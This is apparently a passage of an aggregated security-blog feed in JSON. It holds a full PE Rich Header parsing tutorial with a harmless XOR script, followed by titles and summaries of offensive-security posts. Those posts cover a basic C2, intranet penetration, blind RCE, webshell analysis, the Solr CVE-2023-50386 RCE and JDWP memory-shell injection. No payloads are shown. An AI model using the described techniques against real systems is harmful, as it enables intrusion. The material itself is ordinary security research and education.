chunk of XORed data followed by a signature (Rich) and a 32-bit checksum value that is the XOR key. The encrypted data consists of a DWORD signature DanS, 3 zeroed-out DWORDs for padding, then pairs of DWORDS each pair representing an entry, and each entry holds a tool name, its build number and the number of times it’s been used. In each DWORD pair the first pair holds the type ID or the product ID in the high WORD and the build ID in the low WORD, the second pair holds the use count. PE-bear parses the Rich Header automatically: As you can see the DanS signature is the first thing in the structure, then there are 3 zeroed-out DWORDs and after that comes the entries. We can also see the corresponding tools and Visual Studio versions of the product and build IDs. As an exercise I wrote a script to parse this header myself, it’s a very simple process, all we need to do is to XOR the data, then read the entry pairs and translate them. Rich Header data: 7E 13 87 AA 3A 72 E9 F9 3A 72 E9 F9 3A 72 E9 F9 33 0A 7A F9 30 72 E9 F9 F1 1D E8 F8 38 72 E9 F9 F1 1D EC F8 2B 72 E9 F9 F1 1D ED F8 30 72 E9 F9 F1 1D EA F8 39 72 E9 F9 61 1A E8 F8 3F 72 E9 F9 3A 72 E8 F9 0A 72 E9 F9 BC 02 E0 F8 3B 72 E9 F9 BC 02 16 F9 3B 72 E9 F9 BC 02 EB F8 3B 72 E9 F9 52 69 63 68 3A 72 E9 F9 00 00 00 00 00 00 00 00 Script: import textwrap def xor(data, key): return bytearray( ((data[i] ^ key[i % len(key)]) for i in range(0, len(data))) ) def rev_endiannes(data): tmp = [data[i:i+8] for i in range(0, len(data), 8)] for i in range(len(tmp)): tmp[i] = \"\".join(reversed([tmp[i][x:x+2] for x in range(0, len(tmp[i]), 2)])) return \"\".join(tmp) data = bytearray.fromhex(\"7E1387AA3A72E9F93A72E9F93A72E9F9330A7AF93072E9F9F11DE8F83872E9F9F11DECF82B72E9F9F11DEDF83072E9F9F11DEAF83972E9F9611AE8F83F72E9F93A72E8F90A72E9F9BC02E0F83B72E9F9BC0216F93B72E9F9BC02EBF83B72E9F9\") key = bytearray.fromhex(\"3A72E9F9\") rch_hdr = (xor(data,key)).hex() rch_hdr = textwrap.wrap(rch_hdr, 16) for i in range(2,len(rch_hdr)): tmp = textwrap.wrap(rch_hdr[i], 8) f1 = rev_endiannes(tmp[0]) f2 = rev_endiannes(tmp[1]) print(\"{} {} : {}.{}.{}\".format(f1, f2, str(int(f1[4:],16)), str(int(f1[0:4],16)), str(int(f2,16)) )) Please note that I had to reverse the byte-order because the data was presented in little-endian. After running the script we can see an output that’s identical to PE-bear’s interpretation, meaning that the script works fine. Translating these values into the actual tools types and versions is a matter of collecting the values from actual Visual Studio installations. I checked the source code of bearparser (the parser used in PE-bear) and I found comments mentioning where these values were collected from. //list from: https://github.com/kirschju/richheader //list based on: https://github.com/kirschju/richheader + pnx's notes You can check the source code for yourself, it’s on hasherezade’s (PE-bear author) Github page. Conclusion In this post we talked about the first two parts of the PE file, the DOS header and the DOS stub, we looked at the members of the DOS header structure and we reversed the DOS stub program. We also looked at the Rich Header, a structure that’s not essentially a part of the PE file format but was worth checking. The following image summarizes what we’ve talked about in this post:",
          "link": "https://0xrick.github.io/win-internals/pe3/",
          "publishedOn": "2021-10-22T01:02:00.000Z",
          "wordCount": 2184,
          "title": "A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe2/",
          "author": null,
          "description": "A dive into the PE file format - PE file structure - Part 1: Overview Introduction The aim of this post is to provide a basic introduction to the PE file structure without talking about any details. PE files PE stands for Portable Executable, it’s a file format for executables used in Windows operating systems, it’s based on the COFF file format (Common Object File Format). Not only .exe files are PE files, dynamic link libraries (.dll), Kernel modules (.srv), Control panel applications (.cpl) and many others are also PE files. A PE file is a data structure that holds information necessary for the OS loader to be able to load that executable into memory and execute it. Structure Overview A typical PE file follows the structure outlined in the following figure: If we open an executable file with PE-bear we’ll see the same thing: DOS Header Every PE file starts with a 64-bytes-long structure called the DOS header, it’s what makes the PE file an MS-DOS executable. DOS Stub After the DOS header comes the DOS stub which is a small MS-DOS 2.0 compatible executable that just prints an error message saying “This program cannot be run in DOS mode” when the program is run in DOS mode. NT Headers The NT Headers part contains three main parts: PE signature: A 4-byte signature that identifies the file as a PE file. File Header: A standard COFF File Header. It holds some information about the PE file. Optional Header: The most important header of the NT Headers, its name is the Optional Header because some files like object files don’t have it, however it’s required for image files (files like .exe files). This header provides important information to the OS loader. Section Table The section table follows the Optional Header immediately, it is an array of Image Section Headers, there’s a section header for every section in the PE file. Each header contains information about the section it refers to. Sections Sections are where the actual contents of the file are stored, these include things like data and resources that the program uses, and also the actual code of the program, there are several sections each one with its own purpose. Conclusion In this post we looked at a very basic overview of the PE file structure and talked briefly about the main parts of a PE files. In the upcoming posts we’ll talk about each one of these parts in much more detail.",
          "link": "https://0xrick.github.io/win-internals/pe2/",
          "publishedOn": "2021-10-22T01:01:00.000Z",
          "wordCount": 616,
          "title": "A dive into the PE file format - PE file structure - Part 1: Overview",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe1/",
          "author": null,
          "description": "A dive into the PE file format - Introduction What is this ? This is going to be a series of blog posts covering PE files in depth, it’s going to include a range of different topics, mainly the structure of PE files on disk and the way PE files get mapped and loaded into memory, we’ll also discuss applying that knowledge into building proof-of-concepts like PE parsers, packers and loaders, and also proof-of-concepts for some of the memory injection techniques that require this kind of knowledge, techniques like PE injection, process hollowing, dll reflective injection etc.. Why ? The more I got into reverse engineering or malware development the more I found that knowledge about the PE file format is absolutely essential, I already knew the basics about PE files but I never learned about them properly. Lately I have decided to learn about PE files, so the upcoming series of posts is going to be a documentation of what I’ve learned. These posts are not going to cover anything new, there are a lot of resources that talk about the same thing, also the techniques that are going to be covered later have been known for some time. The goal is not to present anything new, the goal is to form a better understanding of things that already exist. Contribution If you’d like to add anything or if you found a mistake that needs correction feel free to contact me. Contact information can be found in the about page. Update: File structure - part 1: Overview File structure - part 2: DOS Header, DOS Stub and Rich Header File structure - part 3: NT Headers File structure - part 4: Data Directories, Section Headers and Sections File structure - part 5: PE Imports (Import Directory Table, ILT, IAT) File structure - part 6: PE Base Relocations File structure - lab1: Writing a PE Parser",
          "link": "https://0xrick.github.io/win-internals/pe1/",
          "publishedOn": "2021-10-22T01:00:00.000Z",
          "wordCount": 493,
          "title": "A dive into the PE file format - Introduction",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/misc/c2/",
          "author": null,
          "description": "Introduction",
          "link": "https://0xrick.github.io/misc/c2/",
          "publishedOn": "2020-04-16T01:00:00.000Z",
          "wordCount": 4959,
          "title": "Building a Basic C2",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/hack-the-box/ai/",
          "author": null,
          "description": "Hack The Box - AI",
          "link": "https://0xrick.github.io/hack-the-box/ai/",
          "publishedOn": "2020-01-25T05:00:00.000Z",
          "wordCount": 1630,
          "title": "Hack The Box - AI",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "AabyssZG's Blog",
      "feedUrl": "https://blog.zgsec.cn/feed/",
      "siteUrl": "https://blog.zgsec.cn/",
      "articles": [
        {
          "id": "https://blog.zgsec.cn/archives/608.html",
          "author": "AabyssZG",
          "description": "0# 概述哈哈，各位师傅好久不见啦，最近比较忙，抽空将本文写出来~说到信息搜集，一般大家都会联想到Web外部打点的暴露面信息搜集。但在内网渗透的过程中，信息搜集也是决定成败的决定性因素特别是做持...",
          "link": "https://blog.zgsec.cn/archives/608.html",
          "publishedOn": "2024-06-30T11:08:00.000Z",
          "wordCount": 2497,
          "title": "内网渗透信息搜集骚姿势",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/577.html",
          "author": "AabyssZG",
          "description": "0# 概述注：本文原创首发自T00ls论坛，文章链接：https://www.t00ls.com/thread-71282-1-1.html最近刷了刷公众号，偶然看到吾爱破解论坛官方公众号发布了...",
          "link": "https://blog.zgsec.cn/archives/577.html",
          "publishedOn": "2024-02-19T02:39:00.000Z",
          "wordCount": 732,
          "title": "52PoJie论坛2024春节红包-Web解题思路",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/573.html",
          "author": "AabyssZG",
          "description": "1# 概述今天是2024年的第一天，很高兴能再次和大家见面，我是渊龙Sec安全团队的创始人——曾哥 @AabyssZG。首先，在这个日子里面祝各位师傅元旦快乐，在新的一年里面：事业如虎添翼，财运...",
          "link": "https://blog.zgsec.cn/archives/573.html",
          "publishedOn": "2024-01-01T06:57:17.000Z",
          "wordCount": 659,
          "title": "感谢，渊龙三周年与龙年展望",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/548.html",
          "author": "AabyssZG",
          "description": "1# 概述不知不觉，个人博客已经开办了一年了回头看一年前的自己，仍有些感触，遂在闲暇时光提笔写下一些碎碎念数了数我在这一年发表过的博客文章，共计约二十余篇，其实我是真没想到能有那么多文章，比我原...",
          "link": "https://blog.zgsec.cn/archives/548.html",
          "publishedOn": "2023-12-14T02:39:00.000Z",
          "wordCount": 762,
          "title": "一周年小记&amp;&amp;那些快乐的技术时光",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/535.html",
          "author": "AabyssZG",
          "description": "0# 概述最近反正也没啥事情干，突然看到朋友 青山ya 师傅审计出了腾讯开源的xSRC系统的逻辑漏洞，于是我就没事干，把开源的xSRC源码拉下来跟着审计了一波但在审计的过程中，我在TSRC（腾讯...",
          "link": "https://blog.zgsec.cn/archives/535.html",
          "publishedOn": "2023-11-25T06:59:00.000Z",
          "wordCount": 898,
          "title": "一场跨越十年的超时空思维碰撞",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/504.html",
          "author": "AabyssZG",
          "description": "比赛概述这是2023浙江省大学生网络与信息安全决赛的Misc篇，将本次比赛的相关题目进行了整理，欢迎各位师傅的复现和交流学习~比赛总体emmmm怎么说呢，难受死了，好多题目都是临门一脚的状态。。...",
          "link": "https://blog.zgsec.cn/archives/504.html",
          "publishedOn": "2023-11-12T03:29:00.000Z",
          "wordCount": 842,
          "title": "2023浙江省大学生网络与信息安全决赛-Misc篇",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/484.html",
          "author": "AabyssZG",
          "description": "如果你要参加AWD相关比赛，相信本项目能给你带来帮助~手册版本号：V1.2.2-2023/10/21这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容如果你...",
          "link": "https://blog.zgsec.cn/archives/484.html",
          "publishedOn": "2023-10-21T04:25:00.000Z",
          "wordCount": 1641,
          "title": "从零学习AWD比赛指导手册",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/481.html",
          "author": "AabyssZG",
          "description": "0# 概述最近一段时间项目也比较多，再加上最近还在维护开源项目，所以挺忙的。乘着国庆时间，好好放松一下，顺便借着国庆期间更新一下自己许久未更新的博客哈哈~本篇文章，我们将深入学习著名BurpSu...",
          "link": "https://blog.zgsec.cn/archives/481.html",
          "publishedOn": "2023-10-01T03:02:00.000Z",
          "wordCount": 798,
          "title": "HaE入门到精通：三条影响你一生的HaE规则",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/320.html",
          "author": "AabyssZG",
          "description": "前言今年很巧，8月23日项目结束后，24号2023成都CCS网络安全大会就召开了。我今年刚好在武汉做项目，想了想，结束直接一个飞机飞往成都，开启了本次成都安全之旅。成都的师傅们都很热情，也结识了...",
          "link": "https://blog.zgsec.cn/archives/320.html",
          "publishedOn": "2023-09-01T06:04:00.000Z",
          "wordCount": 688,
          "title": "2023成都CCS大会&amp;&amp;补天城市沙龙有感",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        },
        {
          "id": "https://blog.zgsec.cn/archives/306.html",
          "author": "AabyssZG",
          "description": "0# 概述在日常的渗透过程中，总会碰到一些RCE漏洞，无回显的RCE漏洞更是家常便饭。对于无回显的漏洞利用，网上有不少文章，但我看了半天，都是Linux系统的当无回显RCE漏洞碰上Win服务器，...",
          "link": "https://blog.zgsec.cn/archives/306.html",
          "publishedOn": "2023-07-17T10:15:00.000Z",
          "wordCount": 945,
          "title": "当无回显RCE碰上Win服务器",
          "imageUrl": "https://blog.zgsec.cn/title.jpg"
        }
      ]
    },
    {
      "title": "Chen's Blog",
      "feedUrl": "https://gh0st.cn/feed.xml",
      "siteUrl": "https://gh0st.cn",
      "articles": [
        {
          "id": "https://gh0st.cn/archives/2023-12-18/1",
          "author": null,
          "description": "客户端应用漏洞是许多人在进行漏洞挖掘和安全测试时容易忽视的领域。随着技术的更迭和攻防手段的升级，客户端应用漏洞也逐渐出现在大众视野中（APT攻击、攻防赛事等等），在本次议题中，我们将重点关注PC侧的客户端应用程序，如即时通讯、远程服务、视频软件等应用，探索其中存在的漏洞和潜在的安全风险。",
          "link": "https://gh0st.cn/archives/2023-12-18/1",
          "publishedOn": "2023-12-17T16:00:00.000Z",
          "wordCount": 301,
          "title": "被忽视的暗面：客户端应用漏洞挖掘之旅",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2022-08-18/1",
          "author": null,
          "description": "我眼中的红队",
          "link": "https://gh0st.cn/archives/2022-08-18/1",
          "publishedOn": "2022-08-17T16:00:00.000Z",
          "wordCount": 125,
          "title": "我眼中的红队",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2021-05-05/1",
          "author": null,
          "description": "某VPN客户端远程下载文件执行模拟逆向分析",
          "link": "https://gh0st.cn/archives/2021-05-05/1",
          "publishedOn": "2021-05-04T16:00:00.000Z",
          "wordCount": 454,
          "title": "某VPN客户端远程下载文件执行模拟逆向分析",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-11-22/1",
          "author": null,
          "description": "记一次攻防演习渗透过程",
          "link": "https://gh0st.cn/archives/2020-11-22/1",
          "publishedOn": "2020-11-21T16:00:00.000Z",
          "wordCount": 273,
          "title": "记一次攻防演习渗透过程",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-09-03/4",
          "author": null,
          "description": "某终端检测响应平台代码审计挖掘（RCE）",
          "link": "https://gh0st.cn/archives/2020-09-03/4",
          "publishedOn": "2020-09-02T16:00:00.000Z",
          "wordCount": 1147,
          "title": "某终端检测响应平台代码审计挖掘（RCE）",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-09-03/3",
          "author": null,
          "description": "某终端检测响应平台代码审计挖掘（权限绕过）",
          "link": "https://gh0st.cn/archives/2020-09-03/3",
          "publishedOn": "2020-09-02T16:00:00.000Z",
          "wordCount": 704,
          "title": "某终端检测响应平台代码审计挖掘（权限绕过）",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-09-03/2",
          "author": null,
          "description": "某终端检测响应平台代码审计分析",
          "link": "https://gh0st.cn/archives/2020-09-03/2",
          "publishedOn": "2020-09-02T16:00:00.000Z",
          "wordCount": 295,
          "title": "某终端检测响应平台代码审计分析",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-09-03/1",
          "author": null,
          "description": "浅谈蓝队反制手段",
          "link": "https://gh0st.cn/archives/2020-09-03/1",
          "publishedOn": "2020-09-02T16:00:00.000Z",
          "wordCount": 296,
          "title": "浅谈蓝队反制手段",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-06-22/1",
          "author": null,
          "description": "Web层面上的那些拒绝服务攻击(DoS)",
          "link": "https://gh0st.cn/archives/2020-06-22/1",
          "publishedOn": "2020-06-21T16:00:00.000Z",
          "wordCount": 360,
          "title": "Web层面上的那些拒绝服务攻击(DoS)",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-01-08/3",
          "author": null,
          "description": "[XSSI]动态JS劫持用户信息",
          "link": "https://gh0st.cn/archives/2020-01-08/3",
          "publishedOn": "2020-01-07T16:00:00.000Z",
          "wordCount": 163,
          "title": "[XSSI]动态JS劫持用户信息",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2020-01-08/2",
          "author": null,
          "description": "利用SourceMap还原网站原始代码(前端)",
          "link": "https://gh0st.cn/archives/2020-01-08/2",
          "publishedOn": "2020-01-07T16:00:00.000Z",
          "wordCount": 136,
          "title": "利用SourceMap还原网站原始代码(前端)",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-11-11/1",
          "author": null,
          "description": "WebFuzzing方法和漏洞案例总结",
          "link": "https://gh0st.cn/archives/2019-11-11/1",
          "publishedOn": "2019-11-10T16:00:00.000Z",
          "wordCount": 180,
          "title": "WebFuzzing方法和漏洞案例总结",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-08-21/1",
          "author": null,
          "description": "对某攻击队的Webshell进行分析",
          "link": "https://gh0st.cn/archives/2019-08-21/1",
          "publishedOn": "2019-08-20T16:00:00.000Z",
          "wordCount": 110,
          "title": "对某攻击队的Webshell进行分析",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-08-20/1",
          "author": null,
          "description": "TRICK: Linux Auditd审计工具",
          "link": "https://gh0st.cn/archives/2019-08-20/1",
          "publishedOn": "2019-08-19T16:00:00.000Z",
          "wordCount": 282,
          "title": "TRICK: Linux Auditd审计工具",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-08-16/1",
          "author": null,
          "description": "随机身份生成脚本",
          "link": "https://gh0st.cn/archives/2019-08-16/1",
          "publishedOn": "2019-08-15T16:00:00.000Z",
          "wordCount": 640,
          "title": "RGPerson - 随机身份生成脚本",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-06-27/1",
          "author": null,
          "description": "基于BurpSuite快速探测越权-Authz插件",
          "link": "https://gh0st.cn/archives/2019-06-27/1",
          "publishedOn": "2019-06-26T16:00:00.000Z",
          "wordCount": 125,
          "title": "基于BurpSuite快速探测越权-Authz插件",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-03-20/1",
          "author": null,
          "description": "浅谈WebSocket跨域劫持漏洞(CSWSH)",
          "link": "https://gh0st.cn/archives/2019-03-20/1",
          "publishedOn": "2019-03-19T16:00:00.000Z",
          "wordCount": 202,
          "title": "浅谈WebSocket跨域劫持漏洞(CSWSH)",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-03-12/1",
          "author": null,
          "description": "记一次移动光猫（GM219-S）安全测试",
          "link": "https://gh0st.cn/archives/2019-03-12/1",
          "publishedOn": "2019-03-11T16:00:00.000Z",
          "wordCount": 351,
          "title": "记一次移动光猫（GM219-S）安全测试",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2019-01-23/1",
          "author": null,
          "description": "博客模板后门",
          "link": "https://gh0st.cn/archives/2019-01-23/1",
          "publishedOn": "2019-01-22T16:00:00.000Z",
          "wordCount": 372,
          "title": "我为何在博客模板留后门",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-12-08/1",
          "author": null,
          "description": "iOS URL Schemes与漏洞的碰撞组合",
          "link": "https://gh0st.cn/archives/2018-12-08/1",
          "publishedOn": "2018-12-07T16:00:00.000Z",
          "wordCount": 313,
          "title": "iOS URL Schemes与漏洞的碰撞组合",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-11-18/1",
          "author": null,
          "description": "打造Mac下APK逆向环境到实战接口XSS挖掘",
          "link": "https://gh0st.cn/archives/2018-11-18/1",
          "publishedOn": "2018-11-17T16:00:00.000Z",
          "wordCount": 156,
          "title": "打造Mac下APK逆向环境到实战接口XSS挖掘",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-11-14/1",
          "author": null,
          "description": "一探短文件名",
          "link": "https://gh0st.cn/archives/2018-11-14/1",
          "publishedOn": "2018-11-13T16:00:00.000Z",
          "wordCount": 146,
          "title": "一探短文件名",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-11-14/2",
          "author": null,
          "description": "浅析PDF事件导致的安全漏洞",
          "link": "https://gh0st.cn/archives/2018-11-14/2",
          "publishedOn": "2018-11-13T16:00:00.000Z",
          "wordCount": 125,
          "title": "浅析PDF事件导致的安全漏洞",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-10-28/3",
          "author": null,
          "description": "Wfuzz高阶功法",
          "link": "https://gh0st.cn/archives/2018-10-28/3",
          "publishedOn": "2018-10-27T16:00:00.000Z",
          "wordCount": 243,
          "title": "Wfuzz高阶功法",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-10-28/2",
          "author": null,
          "description": "Wfuzz基本功",
          "link": "https://gh0st.cn/archives/2018-10-28/2",
          "publishedOn": "2018-10-27T16:00:00.000Z",
          "wordCount": 447,
          "title": "Wfuzz基本功",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-10-28/1",
          "author": null,
          "description": "Wfuzz初上手",
          "link": "https://gh0st.cn/archives/2018-10-28/1",
          "publishedOn": "2018-10-27T16:00:00.000Z",
          "wordCount": 1407,
          "title": "Wfuzz初上手",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-09-11/1",
          "author": null,
          "description": "刺透内网的HTTP代理",
          "link": "https://gh0st.cn/archives/2018-09-11/1",
          "publishedOn": "2018-09-10T16:00:00.000Z",
          "wordCount": 364,
          "title": "刺透内网的HTTP代理",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-08-28/1",
          "author": null,
          "description": "组合拳出击-Self型XSS变废为宝",
          "link": "https://gh0st.cn/archives/2018-08-28/1",
          "publishedOn": "2018-08-27T16:00:00.000Z",
          "wordCount": 387,
          "title": "组合拳出击-Self型XSS变废为宝",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-08-01/1",
          "author": null,
          "description": "GET请求Referer限制绕过总结",
          "link": "https://gh0st.cn/archives/2018-08-01/1",
          "publishedOn": "2018-07-31T16:00:00.000Z",
          "wordCount": 238,
          "title": "GET请求Referer限制绕过总结",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-07-25/1",
          "author": null,
          "description": "议题解读《我的Web应用安全模糊测试之路》",
          "link": "https://gh0st.cn/archives/2018-07-25/1",
          "publishedOn": "2018-07-24T16:00:00.000Z",
          "wordCount": 272,
          "title": "我的Web应用安全模糊测试之路",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-06-20/1",
          "author": null,
          "description": "本文总结一下漫长的渗透测试过程，想尽了各种方法，终于找到了突破口。so没有绝对的安全，所谓的安全性其实都是相对的～",
          "link": "https://gh0st.cn/archives/2018-06-20/1",
          "publishedOn": "2018-06-19T16:00:00.000Z",
          "wordCount": 236,
          "title": "记一次对某企业的渗透测试实战",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-05-05/1",
          "author": null,
          "description": "密码重置思路-小密圈的一道题",
          "link": "https://gh0st.cn/archives/2018-05-05/1",
          "publishedOn": "2018-05-04T16:00:00.000Z",
          "wordCount": 133,
          "title": "密码重置思路-小密圈的一道题",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-04-28/1",
          "author": null,
          "description": "CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限",
          "link": "https://gh0st.cn/archives/2018-04-28/1",
          "publishedOn": "2018-04-27T16:00:00.000Z",
          "wordCount": 368,
          "title": "CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-04-18/1",
          "author": null,
          "description": "Web安全测试学习手册-业务逻辑测试",
          "link": "https://gh0st.cn/archives/2018-04-18/1",
          "publishedOn": "2018-04-17T16:00:00.000Z",
          "wordCount": 244,
          "title": "Web安全测试学习手册-业务逻辑测试",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-04-08/1",
          "author": null,
          "description": "二维码登陆，在表面上来看好像是很安全，但是深入去研究会发现很多都是存在安全隐患～",
          "link": "https://gh0st.cn/archives/2018-04-08/1",
          "publishedOn": "2018-04-07T16:00:00.000Z",
          "wordCount": 244,
          "title": "二维码登陆的常见缺陷剖析",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-03-22/1",
          "author": null,
          "description": "大部分人所认识的CSRF都是写入型的，而本文是对读取型CSRF的一个总结...",
          "link": "https://gh0st.cn/archives/2018-03-22/1",
          "publishedOn": "2018-03-21T16:00:00.000Z",
          "wordCount": 199,
          "title": "读取型CSRF-需要交互的内容劫持",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2018-02-12/1",
          "author": null,
          "description": "OAuth2.0认证缺陷，巧妙的使用白名单让攻击链产生...",
          "link": "https://gh0st.cn/archives/2018-02-12/1",
          "publishedOn": "2018-02-11T16:00:00.000Z",
          "wordCount": 343,
          "title": "OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2017-12-20/1",
          "author": null,
          "description": "笔者挖到了一个selfxss，在思考之后想起了ClickJacking，于是结合之...",
          "link": "https://gh0st.cn/archives/2017-12-20/1",
          "publishedOn": "2017-12-19T16:00:00.000Z",
          "wordCount": 211,
          "title": "鸡肋点搭配ClickJacking攻击-获取管理员权限",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2017-03-29/1",
          "author": null,
          "description": "利用文件流可以给渗透测试带来很大的便利",
          "link": "https://gh0st.cn/archives/2017-03-29/1",
          "publishedOn": "2017-03-28T16:00:00.000Z",
          "wordCount": 281,
          "title": "文件寄生——NTFS文件流实际应用",
          "imageUrl": null
        },
        {
          "id": "https://gh0st.cn/archives/2017-03-08/1",
          "author": null,
          "description": "本文中我们研究了一种新的注入技术让“偏移注入不在需要人品”。在这里定义这种注入技术为：“移位溢注技术”。",
          "link": "https://gh0st.cn/archives/2017-03-08/1",
          "publishedOn": "2017-03-07T16:00:00.000Z",
          "wordCount": 265,
          "title": "移位溢注：告别依靠人品的偏移注入",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "l3yx's blog",
      "feedUrl": "https://l3yx.github.io/atom.xml",
      "siteUrl": "https://l3yx.github.io/atom.xml",
      "articles": [
        {
          "id": "https://l3yx.github.io/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/",
          "author": null,
          "description": "<p>Apache Solr在创建Collection时会以一个特定的目录作为classpath，从中加载一些类，而Collection的备份功能可以导出攻击者上传的恶意class文件到该目录，从而让Solr加载自定义class，造成任意Java代码执行，可以进一步绕过Solr配置的Java沙箱，最终造成任意命令执行。</p>",
          "link": "https://l3yx.github.io/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/",
          "publishedOn": "2024-02-10T11:52:49.000Z",
          "wordCount": 517,
          "title": "Apache Solr Backup/Restore APIs RCE (CVE-2023-50386)分析及挖掘思路",
          "imageUrl": "https://l3yx.github.io/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20240210195410647.png"
        },
        {
          "id": "https://l3yx.github.io/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>这篇笔记是一个多月前写的，本来是想分析漏洞 CVE-2023-22522，但当时关于该漏洞的信息太少，最后也没分析出该漏洞原貌。笔记只留下一些环境搭建的方法和分析思路，另外还有一个不太算漏洞的漏洞，官方给了$300意思意思</p>",
          "link": "https://l3yx.github.io/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "publishedOn": "2024-01-28T03:48:00.000Z",
          "wordCount": 848,
          "title": "Confluence环境搭建及漏洞分析",
          "imageUrl": "https://l3yx.github.io/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210124036385.png"
        },
        {
          "id": "https://l3yx.github.io/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/",
          "author": null,
          "description": "<p>JDWP全称Java Debug Wire Protocol，JDWP漏洞指对外开放了Java调试服务，从而可以实现远程代码执行。目前JDWP的武器化脚本一般只能命令执行，但直接执行命令可能被RASP拦截告警，或者被入侵检测发现，而且在实际渗透测试过程中，也不一定需要执行命令，更需要的可能是一个入口，这种情况下通常是注入内存马或者内存代理。本文基于这个需求实现了可以动态执行代码并注入内存马的JDWP漏洞利用工具。</p>",
